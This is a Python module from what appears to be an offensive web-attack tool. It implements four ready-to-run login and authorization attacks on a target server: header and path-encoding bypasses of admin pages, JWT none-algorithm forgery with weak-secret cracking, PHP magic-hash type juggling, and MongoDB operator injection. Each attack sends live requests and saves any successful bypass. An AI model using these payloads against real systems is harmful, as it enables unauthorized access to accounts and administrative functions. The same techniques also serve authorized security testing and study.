"""
Auth-focused web attacks.

 11. web_auth_bypass       — 40+ header / path / encoding bypasses
 12. web_jwt_attack        — JWT none-alg + weak secret crack
 13. web_php_type_juggling — PHP magic-hash bypass
 14. web_nosql_injection   — MongoDB operator injection in JSON / form
"""
import base64
import hashlib
import hmac
import json
import re
from urllib.parse import urlencode

from Design.colors_cli import console, escape
from modules.target import TargetInfo
from modules.attack_config import AttackConfig
from modules.attacks.web_exploits import _req, _param_url
from modules.attacks.progress import found as _found, fail as _fail, warn as _warn, section as _section, explain as _explain, req_log as _req_log
from modules.downloads import save_text


# ---------- 11. auth_bypass ----------

_BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "localhost"},
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Forwarded-Proto": "https"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1", "X-Original-URL": "/admin"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Host": "localhost"},
]

_BYPASS_PATHS = [
    "/admin", "/admin/", "/ADMIN", "/Admin", "/admin/.",
    "/admin/..", "/admin;/", "/admin/..;/", "//admin", "/./admin",
    "/admin%20", "/admin%09", "/admin%00", "/%2e/admin",
    "/admin/.", "/admin/..", "/admin/*", "/admin?",
]


def run_web_auth_bypass(target, config):
    console.print(
        f"\n[bold primary][ AUTH BYPASS — {len(_BYPASS_HEADERS)} headers × "
        f"{len(_BYPASS_PATHS)} paths ][/bold primary]\n"
    )
    _explain(
        "Auth bypass: combine header tricks (X-Forwarded-For: 127.0.0.1) with\n"
        "path encoding tricks (/admin → //admin, /ADMIN, /admin%20, /%2e/admin).\n"
        "A 200 response without 'login' in body signals a bypass.\n"
        f"Testing {len(_BYPASS_HEADERS) * len(_BYPASS_PATHS)} combinations total."
    )
    base = config.http_path or "/admin"
    total = len(_BYPASS_PATHS) * len(_BYPASS_HEADERS)
    tested = 0
    found_any = False
    for path in _BYPASS_PATHS:
        for hdrs in _BYPASS_HEADERS:
            tested += 1
            h = {"User-Agent": "Mozilla/5.0", **hdrs}
            console.print(
                f"  [dim]  [{tested:>4}/{total}] {path} + {list(hdrs.keys())[0]}[/dim]",
                end="\r"
            )
            resp = _req(target.host, target.port, config.http_use_tls, path, headers=h)
            if not resp:
                continue
            if resp["status"] == 200 and b"login" not in resp["body"].lower():
                console.print()
                _found(f"AUTH BYPASS!", f"{path} + headers={list(hdrs.keys())}")
                save_text(
                    f"path={path}\nheaders={hdrs}\nstatus=200\n"
                    f"body={resp['body'][:1000].decode('utf-8','replace')}",
                    f"bypass_{path.replace('/','_')}.txt",
                    host=target.host, subdir="web",
                )
                found_any = True
    console.print()
    if not found_any:
        _fail("No auth bypass found",
              f"tested {total} path/header combinations")


# ---------- 12. web_jwt_attack ----------

def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _jwt_try_none(token):
    parts = token.split(".")
    if len(parts) != 3:
        return None
    header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
    header["alg"] = "none"
    new_h = _b64url(json.dumps(header, separators=(",", ":")).encode())
    return f"{new_h}.{parts[1]}."


def _jwt_try_weak(token, wordlist):
    parts = token.split(".")
    if len(parts) != 3:
        return None
    h, p, sig = parts
    for secret in wordlist:
        expected = _b64url(
            hmac.new(secret.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest()
        )
        if hmac.compare_digest(expected, sig):
            return secret
    return None


def run_web_jwt_attack(target, config):
    console.print(f"\n[bold primary][ JWT ATTACK ][/bold primary]\n")
    _explain(
        "JWT attack: extract tokens from response/cookies, then:\n"
        "1. none-alg forgery: set alg=none, strip signature — server may accept\n"
        "2. Weak secret crack: try 12 common secrets with HMAC-SHA256\n"
        "If cracked, sign a modified payload with admin/role=admin claims."
    )
    resp = _req(target.host, target.port, config.http_use_tls,
                config.http_path or "/")
    if not resp:
        _fail("No response from target")
        return
    tokens = re.findall(r"eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*",
                        resp["body"].decode("utf-8", "replace"))
    for ck, cv in resp["headers"].items():
        if ck.lower() == "set-cookie":
            tokens += re.findall(r"eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*", cv)

    if not tokens:
        _fail("No JWT found in response headers or body")
        return

    token = tokens[0]
    console.print(f"  [muted]Found JWT:[/muted] [text]{escape(token[:60])}…[/text]")

    _section("none-alg forgery")
    none_tok = _jwt_try_none(token)
    if none_tok:
        _warn("none-alg token crafted — test this against protected endpoints!")
        console.print(f"  [dim]  Token: {escape(none_tok[:80])}…[/dim]")

    _section("Weak secret brute-force")
    common_secrets = [
        "secret", "password", "123456", "changeme", "jwt", "admin",
        "test", "key", "supersecret", "0", "1", "secretkey",
        "mysecret", "jwttoken", "app_secret", "token_secret",
    ]
    for i, secret in enumerate(common_secrets, 1):
        console.print(f"  [dim]  [{i:>2}/{len(common_secrets)}] Trying secret: {escape(secret)}[/dim]", end="\r")
        crack = _jwt_try_weak(token, [secret])
        if crack:
            console.print()
            _found("WEAK JWT SECRET CRACKED!", crack)
            save_text(f"token={token}\nsecret={crack}", "jwt_cracked.txt",
                      host=target.host, subdir="web")
            break
    else:
        console.print()
        _fail("JWT secret not in common wordlist", f"tried {len(common_secrets)} secrets")


# ---------- 13. web_php_type_juggling ----------

_MAGIC_HASHES = [
    "0", "0e0", "0e1", "0e123", "0e462097431906509019562988736854",
    "240610708", "QNKCDZO", "aabg7XSs", "aabC9RqS",
]


def run_web_php_type_juggling(target, config):
    console.print(f"\n[bold primary][ PHP TYPE JUGGLING ][/bold primary]\n")
    _explain(
        "PHP type juggling: exploit == loose comparison with magic hash values.\n"
        "'0e462097431906509019562988736854' == '0e839201' → TRUE (both scientific notation).\n"
        "Also tries: null, empty string, boolean true as form parameters.\n"
        f"Testing {len(_MAGIC_HASHES)} magic values on login form."
    )
    uf = config.http_username_field or "username"
    pf = config.http_password_field or "password"
    path = config.http_path or "/login.php"
    for i, magic in enumerate(_MAGIC_HASHES, 1):
        console.print(f"  [dim]  [{i}/{len(_MAGIC_HASHES)}] {uf}={escape(magic)} / {pf}={escape(magic)}[/dim]", end="\r")
        body = urlencode({uf: magic, pf: magic})
        resp = _req(
            target.host, target.port, config.http_use_tls,
            path, method="POST",
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0",
            },
            body=body,
        )
        if not resp:
            continue
        text = resp["body"].decode("utf-8", "replace").lower()
        if any(k in text for k in ("welcome", "dashboard", "logout", "profile")):
            if not any(k in text for k in ("invalid", "error", "incorrect")):
                console.print()
                _found("Auth bypass via PHP magic hash!", f"value={magic}")
                save_text(f"magic_hash={magic}\npath={path}\n", "type_juggling.txt",
                          host=target.host, subdir="web")
                return
    console.print()
    _fail("No type-juggling bypass", f"tested {len(_MAGIC_HASHES)} magic hash values")


# ---------- 14. web_nosql_injection ----------

_NOSQL_PAYLOADS = [
    {"$ne": None},
    {"$gt": ""},
    {"$regex": ".*"},
    {"$ne": "x"},
    {"$where": "1==1"},
]


def run_web_nosql_injection(target, config):
    console.print(f"\n[bold primary][ NOSQL INJECTION ][/bold primary]\n")
    _explain(
        "MongoDB operator injection: send $ne, $gt, $regex operators in JSON body.\n"
        "{username: {$ne: null}, password: {$ne: null}} bypasses login if Mongo parses it.\n"
        f"Testing {len(_NOSQL_PAYLOADS)} operator payloads + form-encoded variants."
    )
    path = config.http_path or "/login"
    uf = config.http_username_field or "username"
    pf = config.http_password_field or "password"

    for i, payload in enumerate(_NOSQL_PAYLOADS, 1):
        console.print(f"  [dim]  [{i}/{len(_NOSQL_PAYLOADS)}] JSON {escape(str(payload)[:50])}[/dim]", end="\r")
        body = json.dumps({uf: {"$ne": None, **payload}, pf: {"$ne": None}})
        resp = _req(
            target.host, target.port, config.http_use_tls,
            path, method="POST",
            headers={"Content-Type": "application/json",
                     "User-Agent": "Mozilla/5.0"},
            body=body.encode(),
        )
        if not resp:
            continue
        text = resp["body"].decode("utf-8", "replace").lower()
        if any(k in text for k in ("welcome", "dashboard", "logout", "token")):
            if not any(k in text for k in ("error", "invalid", "failed")):
                console.print()
                _found("NoSQL injection bypass!", f"payload={escape(json.dumps(payload))}")
                save_text(f"path={path}\npayload={body}\n",
                          "nosql_bypass.txt", host=target.host, subdir="web")
                return
    console.print()
    _fail("No NoSQL injection detected",
          f"tested {len(_NOSQL_PAYLOADS)} payloads on {path}")

    # Save full attack report
    try:
        from modules.reporter import save_attack_report
        rp = save_attack_report(
            host=target.host, attack_name="nosql_injection",
            target_info=f"HTTP {target.host}:{target.port}{path}",
            findings=[],
            requests_made=len(_NOSQL_PAYLOADS),
        )
        console.print(f"  [muted]Report saved:[/muted] [text]{rp}[/text]")
    except Exception:
        pass